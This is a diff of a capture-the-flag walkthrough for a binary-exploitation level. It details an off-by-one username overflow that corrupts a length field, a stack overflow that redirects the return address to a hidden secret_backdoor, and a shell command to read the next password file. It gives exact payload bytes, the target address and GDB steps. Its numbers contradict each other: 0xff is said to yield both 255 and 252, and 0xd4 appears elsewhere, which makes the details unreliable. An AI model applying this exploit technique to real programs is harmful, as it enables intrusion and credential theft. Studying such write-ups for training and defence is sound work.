@@ -1,25 +1,90 @@
-Level 9 - Walkthrough
-========================
+# Level 9 - Walkthrough
 
-1) Recon
-- Files discovered: `source`, `Ressources/script`, `flag`
-- Useful commands used: `ls`, `cat`, `objdump -d ./level09 | less`
+## Overview
 
-2) Vulnerability confirmation
-- What is vulnerable: `set_username` copies up to 41 bytes into `username[40]`, overwriting `msg_len` in `message_ctx`.
-- Why it is exploitable: the corrupted `msg_len` is later used as the length for `strncpy` in `set_msg`, enabling a controlled overflow of `msg` into the saved return address and redirecting execution to `secret_backdoor`.
+This program implements a small “send a message” console flow. It prints a banner,
+initializes a message context, asks for a username, asks for a message, and then
+prints “Msg sent!”.
 
-3) Exploitation steps
-- Exact command sequence:
-	- `python - <<'PY' | ./level09`
-	- `u = 'a'*40 + '\xd4' + '\n'`
-	- `m = 'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n'`
-	- `c = 'cat /home/users/end/.pass\n'`
-	- `print(u + m + c)`
-	- `PY`
-- Payload used: username overflow to set `msg_len` to `0xd4`, then `msg` overflow with padding + `secret_backdoor` address (`0x55555555488c`, little-endian).
+## Flow
 
-4) Result
-- Retrieved next password from: `/home/users/end/.pass` via `secret_backdoor` command execution.
-- Notes for defense/evaluation: fix the off-by-one in `set_username` and avoid using attacker-controlled lengths in `strncpy`.
+1. `main` prints the banner and calls `handle_msg`.
+2. `handle_msg` initializes a `message_ctx` on the stack, zeroes `username`, sets
+   `msg_len = 140`, and calls `set_username` then `set_msg`.
+3. `set_username` reads input into a local buffer, copies it into `ctx->username`,
+   and prints a welcome line using the stored username.
+4. `set_msg` reads a message into a local buffer, then copies up to `ctx->msg_len`
+   bytes into `ctx->msg`.
+5. Program prints “Msg sent!” and exits.
 
+## Key Functions
+
+- `set_username`: Prompts for a username, reads up to 127 bytes, and copies
+  characters into `ctx->username` until index `0x28` (40) or `\0`.
+- `set_msg`: Prompts for the message, reads up to 1023 bytes, then copies
+  `ctx->msg_len` bytes (140 by default) into `ctx->msg` with `strncpy`.
+- `secret_backdoor`: Reads a line from stdin and passes it to `system`. It is not
+  called in the normal flow, but represents a hidden backdoor if reachable.
+- `handle_msg`: Sets up the context and coordinates the username/message steps.
+
+## Notable Issues
+
+- Off-by-one overflow: `set_username` uses `index <= 0x28`, which can write 41
+  bytes into a 40-byte `username` buffer.
+- Missing null termination: `set_username` does not guarantee `username` ends
+  with `\0`, so `printf("%s")` can read past the buffer.
+- Backdoor behavior: `secret_backdoor` executes arbitrary shell commands via
+  `system` if it can be invoked.
+- Message length trust: `strncpy` is bounded by `ctx->msg_len`, but if `msg_len`
+  is corrupted, it could enable a larger copy than intended.
+
+## Exploit Explanation
+
+The exploit chains two issues: the off-by-one overflow in `set_username` and the
+callable `secret_backdoor` function.
+
+1. **Corrupt `msg_len` via username overflow**
+   The `message_ctx` layout is `msg[140]`, `username[40]`, then `msg_len`.
+   Because `set_username` writes up to 41 bytes, the 41st byte overwrites the
+   least significant byte of `msg_len`. Setting that byte to `0xff` changes the
+   length from `0x0000008c` (140) to `0x000000ff` (255), allowing a longer copy.
+
+2. **Overflow `msg` and overwrite the return address**
+   With `msg_len` increased, `set_msg` copies 252 bytes into a 140‑byte `msg`
+   buffer, overflowing into the stack frame. The payload can overwrite the saved
+   return address so that execution returns into `secret_backdoor`.
+
+3. **Trigger command execution**
+   `secret_backdoor` reads one more line from stdin and passes it to `system`,
+   so the final input line can be a shell command (e.g., to read the flag).
+
+The provided `Ressources/script` demonstrates this sequence: it crafts a username
+that flips `msg_len`, a message that overwrites the return address with the
+address of `secret_backdoor`, then supplies a shell command for the backdoor to
+execute.
+
+# Script Explanation
+
+The program first asks for a username. We input `'a'*40 + '\xff' + '\n'`. This fills the 40‑byte username buffer and the extra byte (0xff) overflows into msg_len, changing it from 140 to 252.
+
+Then the program asks for the message. We input `'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n'`.
+
+To find the offset (200), we use a cyclic pattern in GDB:
+- shell python -c 'import sys; u="a"*40+"\xd4\n"; m="Aa0Aa1...Aj9"; sys.stdout.write(u+m)' > /tmp/inp
+- run < /tmp/inp
+
+The program segfaults in handle_msg because the saved return address is corrupted.
+We inspect the saved RIP with:
+- info frame
+
+Example output:
+saved rip 0x4138674137674136
+
+That value appears in the cyclic pattern at offset 200, so the offset is 200.
+
+Then we overwrite the saved RIP with the address of secret_backdoor. We get the address in GDB with p secret_backdoor :
+
+(gdb) p secret_backdoor
+$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+secret_backdoor reads a line from stdin and passes it to system so we provide ` cat /home/users/end/.pass\n `.
